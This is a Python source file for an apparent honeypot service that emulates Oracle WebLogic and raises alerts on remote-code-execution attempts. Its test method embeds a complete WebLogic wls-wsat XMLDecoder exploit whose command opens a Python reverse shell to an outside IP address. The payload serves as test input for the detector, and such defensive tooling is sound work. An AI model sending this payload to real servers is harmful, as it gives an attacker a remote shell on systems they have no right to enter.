# -*- coding: utf-8 -*-
"""Oracle WebLogic Honeycomb Service."""
from __future__ import unicode_literals

import requests
from six.moves.socketserver import ThreadingMixIn
from six.moves.BaseHTTPServer import HTTPServer

from base_service import ServerCustomService

import weblogic_server

WEBLOGIC_PORT = 8000
EVENT_TYPE_FIELD_NAME = 'event_type'
WEBLOGIC_ALERT_TYPE_NAME = 'oracle_weblogic_rce'
ORIGINATING_IP_FIELD_NAME = 'originating_ip'
ORIGINATING_PORT_FIELD_NAME = 'originating_port'
CMD_FIELD_NAME = 'cmd'


class NonBlockingHTTPServer(ThreadingMixIn, HTTPServer):
    """Threading HTTPService stub class."""


class OracleWebLogicService(ServerCustomService):
    """Oracle WebLogic Honeycomb Service."""

    def __init__(self, *args, **kwargs):
        super(OracleWebLogicService, self).__init__(*args, **kwargs)
        self.httpd = None

    def alert(self, request, payload):
        """Raise an alert."""
        params = {
            EVENT_TYPE_FIELD_NAME: WEBLOGIC_ALERT_TYPE_NAME,
            ORIGINATING_IP_FIELD_NAME: request.client_address[0],
            ORIGINATING_PORT_FIELD_NAME: request.client_address[1],
            CMD_FIELD_NAME: ' '.join(payload),
        }
        self.add_alert_to_queue(params)

    def on_server_start(self):
        """Initialize Service."""
        self.logger.info("Oracle Weblogic service started on port: %d", WEBLOGIC_PORT)

        requestHandler = weblogic_server.WebLogicHandler
        requestHandler.alert_function = self.alert
        requestHandler.logger = self.logger

        self.httpd = NonBlockingHTTPServer(('0.0.0.0', WEBLOGIC_PORT), requestHandler)

        self.signal_ready()
        self.httpd.serve_forever()

    def on_server_shutdown(self):
        """Shut down gracefully."""
        if self.httpd:
            self.logger.info("Oracle Weblogic service stopped")
            self.httpd.shutdown()

    def test(self):
        """Test service alerts and return a list of triggered event types."""
        exploit = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java>
        <object class="java.lang.ProcessBuilder">
          <array class="java.lang.String" length="3" >
            <void index="0">
              <string>/bin/sh</string>
            </void>
            <void index="1">
              <string>-c</string>
            </void>
            <void index="2">
              <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.c""" \
              """onnect(("69.12.91.160",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=""" \
              """subprocess.call(["/bin/sh","-i"]);'</string>
            </void>
          </array>
          <void method="start"/>
        </object>
      </java>
    </work:WorkContext>
  </soapenv:Header>
  <soapenv:Body/>
</soapenv:Envelope>"""
        requests.post("http://127.0.0.1:{}/wls-wsat/CoordinatorPortType".format(WEBLOGIC_PORT), data=exploit)

        return [WEBLOGIC_ALERT_TYPE_NAME]

    def __str__(self):
        return "Oracle Weblogic"


service_class = OracleWebLogicService
